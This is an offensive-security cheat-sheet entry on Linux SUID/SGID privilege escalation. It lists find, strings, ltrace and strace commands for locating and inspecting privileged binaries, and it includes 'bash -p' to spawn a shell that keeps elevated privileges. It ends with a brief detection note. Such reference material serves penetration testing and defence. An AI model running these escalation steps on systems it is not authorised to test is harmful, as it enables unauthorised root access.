---
technique: SUID and SGID Abuse
category: privilege-escalation
targets: Linux SUID, Linux SGID
protocols: Local
remote_capable: false
tags: linux lpe suid sgid gtfobins
---

# SUID and SGID Abuse

SUID and SGID binaries execute with file owner or group privileges. Misplaced, custom, or GTFOBins-abusable binaries can provide local privilege escalation.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Executable bit | The file must be executable by the current user |
| SUID or SGID bit | The target binary must carry a useful privilege bit |

## Linux

### Find SUID files

#sh #suid

Find files with the SUID bit set.

```sh title:"Find SUID files"
find / -perm -4000 -type f 2>/dev/null
```
<!-- cheat -->

### Find SGID files

#sh #sgid

Find files with the SGID bit set.

```sh title:"Find SGID files"
find / -perm -2000 -type f 2>/dev/null
```
<!-- cheat -->

### Check binary owner

#sh #suid

Show owner, group, and permissions for a target binary.

```sh title:"Check binary permissions"
ls -la "$binary_path"
```
<!-- cheat
var binary_path
-->

### strings review

#sh #suid

Print strings from a target binary for path and command hints.

```sh title:"Review binary strings"
strings "$binary_path"
```
<!-- cheat
var binary_path
-->

### ltrace review

#sh #suid

Trace library calls from a target binary.

```sh title:"Trace library calls"
ltrace "$binary_path"
```
<!-- cheat
var binary_path
-->

### strace review

#sh #suid

Trace syscalls from a target binary.

```sh title:"Trace syscalls"
strace -f "$binary_path"
```
<!-- cheat
var binary_path
-->

### Execute target binary

#sh #suid

Execute a candidate SUID or SGID binary after reviewing its behavior.

```sh title:"Execute candidate privileged binary"
"$binary_path"
```
<!-- cheat
var binary_path
-->

### Bash preserved privileges

#sh #suid #shell

Spawn Bash while preserving effective privileges when Bash itself is SUID.

```sh title:"Spawn preserved-privilege bash"
bash -p
```
<!-- cheat
-->

## Detection

Monitor new SUID or SGID files, permission changes, and privileged binaries spawning shells or interpreters.
